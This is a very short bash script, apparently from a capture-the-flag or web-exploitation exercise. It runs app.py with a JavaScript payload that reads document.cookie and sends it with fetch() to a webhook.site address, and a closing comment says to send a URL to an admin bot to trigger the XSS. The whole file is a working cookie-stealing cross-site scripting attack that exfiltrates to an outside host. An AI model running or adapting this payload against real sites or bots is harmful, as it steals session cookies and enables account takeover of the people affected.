#!/bin/bash

python3 app.py "fetch('https://webhook.site/60a2d491-cbc4-483d-be5f-8c5ed6f5a0c2?a=' + document.cookie);"

# Send the //<your_domain>/any to the bot to trigger the XSS.